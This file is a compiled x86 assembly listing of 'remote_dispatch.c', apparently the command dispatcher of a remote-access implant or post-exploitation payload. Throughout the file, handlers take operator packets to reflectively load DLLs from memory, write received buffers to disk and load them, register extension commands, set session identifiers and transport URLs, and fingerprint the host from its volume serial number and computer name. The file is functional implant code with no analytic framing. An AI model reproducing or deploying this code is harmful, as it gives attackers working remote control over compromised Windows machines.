	.file	"remote_dispatch.c"
	.text
	.globl	_gExtensionList
	.bss
	.align 4
_gExtensionList:
	.space 4
	.globl	_customCommands
	.data
	.align 32
_customCommands:
	.long	12
	.long	_request_core_loadlib
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	10
	.long	_request_core_enumextcmd
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	13
	.long	_request_core_machine_id
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	11
	.long	_request_core_get_session_guid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	21
	.long	_request_core_set_session_guid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	22
	.long	_request_core_set_uuid
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	18
	.long	_request_core_pivot_add
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	19
	.long	_request_core_pivot_remove
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.long	17
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	_request_core_patch_url
	.long	0
	.space 60
	.long	0
	.space 8
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.long	0
	.long	0
	.long	0
	.space 60
	.long	0
	.space 8
	.text
	.globl	_buffer_to_file
	.def	_buffer_to_file;	.scl	2;	.type	32;	.endef
_buffer_to_file:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, 24(%esp)
	movl	$128, 20(%esp)
	movl	$1, 16(%esp)
	movl	$0, 12(%esp)
	movl	$0, 8(%esp)
	movl	$1073741824, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CreateFileA@28, %eax
	call	*%eax
	subl	$28, %esp
	movl	%eax, -24(%ebp)
	cmpl	$-1, -24(%ebp)
	jne	L2
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
	jmp	L3
L2:
	movl	16(%ebp), %eax
	movl	%eax, -20(%ebp)
	jmp	L4
L6:
	movl	-28(%ebp), %eax
	subl	%eax, -20(%ebp)
	movl	-28(%ebp), %eax
	addl	%eax, -16(%ebp)
L4:
	cmpl	$0, -20(%ebp)
	je	L5
	movl	12(%ebp), %edx
	movl	-16(%ebp), %eax
	addl	%eax, %edx
	movl	$0, 16(%esp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteFile@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	jne	L6
L5:
	movl	$0, -12(%ebp)
L3:
	cmpl	$-1, -24(%ebp)
	je	L7
	movl	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CloseHandle@4, %eax
	call	*%eax
	subl	$4, %esp
L7:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_ext_cmd_callback
	.def	_ext_cmd_callback;	.scl	2;	.type	32;	.endef
_ext_cmd_callback:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	%eax, -16(%ebp)
	movl	$0, -12(%ebp)
	cmpl	$0, -16(%ebp)
	je	L10
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	je	L10
	cmpl	$0, 12(%ebp)
	je	L10
	movl	12(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -12(%ebp)
	jmp	L11
L13:
	movl	-16(%ebp), %eax
	movl	4(%eax), %edx
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	cmpl	%eax, %edx
	jnb	L12
	movl	-12(%ebp), %eax
	movl	(%eax), %edx
	movl	-16(%ebp), %eax
	movl	8(%eax), %eax
	cmpl	%eax, %edx
	jnb	L12
	movl	-12(%ebp), %eax
	movl	(%eax), %edx
	movl	-16(%ebp), %eax
	movl	(%eax), %eax
	movl	%edx, 8(%esp)
	movl	$131083, 4(%esp)
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
L12:
	movl	-12(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -12(%ebp)
L11:
	movl	-20(%ebp), %eax
	movl	24(%eax), %eax
	cmpl	%eax, -12(%ebp)
	jne	L13
L10:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_patch_url
	.def	_request_core_patch_url;	.scl	2;	.type	32;	.endef
_request_core_patch_url:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	(%eax), %eax
	cmpl	$1, %eax
	jne	L16
	movl	16(%ebp), %eax
	movl	$5023, (%eax)
	jmp	L17
L16:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	48(%eax), %eax
	movl	%eax, -12(%ebp)
	movl	$65967, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_wstring
	movl	-12(%ebp), %edx
	movl	%eax, 28(%edx)
	movl	16(%ebp), %eax
	movl	$0, (%eax)
L17:
	movl	$1, %eax
	leave
	ret
	.globl	_request_core_enumextcmd
	.def	_request_core_enumextcmd;	.scl	2;	.type	32;	.endef
_request_core_enumextcmd:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L20
	movl	-16(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	$131083, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -24(%ebp)
	movl	$131097, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	-24(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	movl	_gExtensionList, %eax
	leal	-28(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$_ext_cmd_callback, 4(%esp)
	movl	%eax, (%esp)
	call	_list_enumerate
	movl	%eax, -12(%ebp)
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L20:
	movl	$0, %eax
	leave
	ret
	.def	_deinit_server_extension;	.scl	3;	.type	32;	.endef
_deinit_server_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$_customCommands, (%esp)
	call	_command_deregister_all
	call	_deregister_base_dispatch_routines
	movl	$0, %eax
	leave
	ret
	.globl	_register_dispatch_routines
	.def	_register_dispatch_routines;	.scl	2;	.type	32;	.endef
_register_dispatch_routines:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	call	_list_create
	movl	%eax, _gExtensionList
	call	_register_base_dispatch_routines
	movl	%eax, -12(%ebp)
	movl	$_customCommands, (%esp)
	call	_command_register_all
	movl	$28, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L26
	movl	$28, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-16(%ebp), %eax
	movl	$_deinit_server_extension, 8(%eax)
	movl	-16(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	_extensionCommands, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 20(%eax)
	movl	_gExtensionList, %eax
	movl	-16(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_list_push
L26:
	nop
	leave
	ret
	.globl	_deregister_dispatch_routines
	.def	_deregister_dispatch_routines;	.scl	2;	.type	32;	.endef
_deregister_dispatch_routines:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
L31:
	movl	_gExtensionList, %eax
	movl	%eax, (%esp)
	call	_list_pop
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L33
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L30
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L30:
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
	jmp	L31
L33:
	nop
	movl	_gExtensionList, %eax
	movl	%eax, (%esp)
	call	_list_destroy
	nop
	leave
	ret
	.globl	_stagelessinit_extension
	.def	_stagelessinit_extension;	.scl	2;	.type	32;	.endef
_stagelessinit_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	_gExtensionList, %eax
	movl	(%eax), %eax
	movl	%eax, -12(%ebp)
	jmp	L35
L37:
	movl	-12(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L36
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	16(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	8(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
L36:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -12(%ebp)
L35:
	cmpl	$0, -12(%ebp)
	jne	L37
	movl	$0, %eax
	leave
	ret
	.globl	_load_extension
	.def	_load_extension;	.scl	2;	.type	32;	.endef
_load_extension:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$14, -12(%ebp)
	movl	$28, (%esp)
	call	_malloc
	movl	%eax, -28(%ebp)
	cmpl	$0, -28(%ebp)
	je	L40
	movl	$28, 8(%esp)
	movl	$0, 4(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-28(%ebp), %eax
	movl	8(%ebp), %edx
	movl	%edx, (%eax)
	cmpl	$0, 12(%ebp)
	je	L41
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 4(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 8(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$5, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 12(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$4, 4(%esp)
	movl	%eax, (%esp)
	call	_GetProcAddressR@8
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 16(%edx)
	jmp	L42
L41:
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 4(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$3, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 8(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$5, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 12(%edx)
	movl	-28(%ebp), %eax
	movl	(%eax), %eax
	movl	$4, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %edx
	movl	%eax, 16(%edx)
L42:
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L43
	movl	-28(%ebp), %eax
	movl	24(%ebp), %edx
	movl	%edx, 24(%eax)
	movl	-28(%ebp), %eax
	movl	4(%eax), %eax
	movl	_met_api, %edx
	movl	16(%ebp), %ecx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -12(%ebp)
	movl	_extensionCommands, %edx
	movl	-28(%ebp), %eax
	movl	%edx, 20(%eax)
	cmpl	$0, -12(%ebp)
	jne	L44
	movl	-28(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L45
	movl	-28(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -16(%ebp)
	jmp	L46
L47:
	movl	-28(%ebp), %eax
	movl	12(%eax), %eax
	movl	-16(%ebp), %edx
	movl	(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-16(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -16(%ebp)
L46:
	cmpl	$0, -16(%ebp)
	jne	L47
L45:
	movl	_gExtensionList, %eax
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_list_push
	jmp	L43
L44:
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_free
L43:
	cmpl	$0, 20(%ebp)
	je	L40
	movl	-28(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -20(%ebp)
	jmp	L48
L52:
	movl	-20(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, 8(%esp)
	movl	$131083, 4(%esp)
	movl	20(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_uint
	movl	_gExtensionList, %eax
	movl	(%eax), %eax
	movl	%eax, -24(%ebp)
	jmp	L49
L51:
	movl	-24(%ebp), %eax
	movl	8(%eax), %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	cmpl	-28(%ebp), %eax
	je	L50
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L50
	movl	-32(%ebp), %eax
	movl	12(%eax), %eax
	movl	-20(%ebp), %edx
	movl	(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
L50:
	movl	-24(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -24(%ebp)
L49:
	cmpl	$0, -24(%ebp)
	jne	L51
	movl	-20(%ebp), %eax
	movl	156(%eax), %eax
	movl	%eax, -20(%ebp)
L48:
	movl	-28(%ebp), %eax
	movl	24(%eax), %eax
	cmpl	%eax, -20(%ebp)
	jne	L52
L40:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_request_core_loadlib
	.def	_request_core_loadlib;	.scl	2;	.type	32;	.endef
_request_core_loadlib:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$88, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -28(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -24(%ebp)
	movl	_extensionCommands, %eax
	movl	%eax, -36(%ebp)
	movl	$65936, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -20(%ebp)
	movl	$131099, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_uint
	movl	%eax, -32(%ebp)
	cmpl	$0, -20(%ebp)
	jne	L55
	movl	$87, -12(%ebp)
	jmp	L56
L55:
	movl	-32(%ebp), %eax
	andl	$4, %eax
	testl	%eax, %eax
	jne	L57
	leal	-56(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262170, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv
	testl	%eax, %eax
	jne	L58
	movl	$65937, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_string
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L59
L58:
	movl	$87, -12(%ebp)
	jmp	L56
L59:
	movl	-32(%ebp), %eax
	andl	$1, %eax
	testl	%eax, %eax
	jne	L60
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_reflective_loader
	movl	%eax, -44(%ebp)
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	-44(%ebp), %ecx
	movl	%ecx, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_LoadLibraryR@12
	subl	$12, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L61
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_libloader_load_library
	movl	%eax, -16(%ebp)
	jmp	L62
L61:
	movl	$1, -24(%ebp)
L62:
	cmpl	$0, -16(%ebp)
	je	L63
	movl	$0, %eax
	jmp	L64
L63:
	movl	$1168, %eax
L64:
	movl	%eax, -12(%ebp)
	jmp	L65
L60:
	movl	-56(%ebp), %edx
	movl	-48(%ebp), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_buffer_to_file
	movl	%eax, -12(%ebp)
L65:
	movl	-40(%ebp), %eax
	movl	%eax, -20(%ebp)
L57:
	cmpl	$0, -12(%ebp)
	jne	L70
	cmpl	$0, -16(%ebp)
	jne	L67
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L67
	movl	__imp__GetLastError@0, %eax
	call	*%eax
	movl	%eax, -12(%ebp)
L67:
	movl	-32(%ebp), %eax
	andl	$2, %eax
	testl	%eax, %eax
	je	L56
	cmpl	$0, -16(%ebp)
	je	L56
	movl	-36(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_extension
	movl	%eax, -12(%ebp)
	jmp	L56
L70:
	nop
L56:
	cmpl	$0, -28(%ebp)
	je	L68
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L68:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_request_core_set_uuid
	.def	_request_core_set_uuid;	.scl	2;	.type	32;	.endef
_request_core_set_uuid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -12(%ebp)
	movl	$0, -20(%ebp)
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262605, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L72
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	16(%eax), %edx
	movl	$16, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
L72:
	cmpl	$0, -12(%ebp)
	je	L73
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L73:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_get_session_guid
	.def	_request_core_get_session_guid;	.scl	2;	.type	32;	.endef
_request_core_get_session_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L76
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$32, %eax
	movl	$16, 12(%esp)
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_raw
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	call	_packet_transmit_response
L76:
	movl	$0, %eax
	leave
	ret
	.globl	_request_core_set_session_guid
	.def	_request_core_set_session_guid;	.scl	2;	.type	32;	.endef
_request_core_set_session_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	$0, -20(%ebp)
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$262606, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_get_tlv_value_raw
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L79
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	32(%eax), %edx
	movl	$16, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	jmp	L80
L79:
	movl	$160, -12(%ebp)
L80:
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_empty_response
	movl	$0, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 2
LC0:
	.ascii "%\0"
	.ascii "0\0"
	.ascii "4\0x\0-\0%\0"
	.ascii "0\0"
	.ascii "4\0x\0:\0%\0s\0\0\0"
	.text
	.globl	_request_core_machine_id
	.def	_request_core_machine_id;	.scl	2;	.type	32;	.endef
_request_core_machine_id:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$1112, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_create_response
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L83
	movl	$260, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetSystemDirectoryA@8, %eax
	call	*%eax
	subl	$8, %esp
	testl	%eax, %eax
	je	L84
	movl	$260, -24(%ebp)
	movl	$92, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	call	_wcschr
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	addl	$2, %eax
	movw	$0, (%eax)
	movl	$0, 28(%esp)
	movl	$0, 24(%esp)
	movl	$0, 20(%esp)
	movl	$0, 16(%esp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetVolumeInformationA@32, %eax
	call	*%eax
	subl	$32, %esp
	leal	-24(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-548(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetComputerNameA@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-28(%ebp), %eax
	movzwl	%ax, %edx
	movl	-28(%ebp), %eax
	shrl	$16, %eax
	movzwl	%ax, %eax
	leal	-548(%ebp), %ecx
	movl	%ecx, 24(%esp)
	movl	%edx, 20(%esp)
	movl	%eax, 16(%esp)
	movl	$LC0, 12(%esp)
	movl	$259, 8(%esp)
	movl	$260, 4(%esp)
	leal	-1068(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___snwprintf_s, %eax
	call	*%eax
	leal	-1068(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$65996, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_add_tlv_wstring
L84:
	movl	-16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_packet_transmit_response
L83:
	movl	$0, %eax
	leave
	ret
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_request_core_pivot_add;	.scl	2;	.type	32;	.endef
	.def	_request_core_pivot_remove;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_uint;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_wstring;	.scl	2;	.type	32;	.endef
	.def	_packet_create_response;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_uint;	.scl	2;	.type	32;	.endef
	.def	_list_enumerate;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_response;	.scl	2;	.type	32;	.endef
	.def	_command_deregister_all;	.scl	2;	.type	32;	.endef
	.def	_deregister_base_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_list_create;	.scl	2;	.type	32;	.endef
	.def	_register_base_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_command_register_all;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_list_push;	.scl	2;	.type	32;	.endef
	.def	_list_pop;	.scl	2;	.type	32;	.endef
	.def	_free;	.scl	2;	.type	32;	.endef
	.def	_list_destroy;	.scl	2;	.type	32;	.endef
	.def	_GetProcAddressR@8;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_string;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_reflective_loader;	.scl	2;	.type	32;	.endef
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
	.def	_libloader_load_library;	.scl	2;	.type	32;	.endef
	.def	_packet_get_tlv_value_raw;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_raw;	.scl	2;	.type	32;	.endef
	.def	_packet_transmit_empty_response;	.scl	2;	.type	32;	.endef
	.def	_wcschr;	.scl	2;	.type	32;	.endef
	.def	_packet_add_tlv_wstring;	.scl	2;	.type	32;	.endef
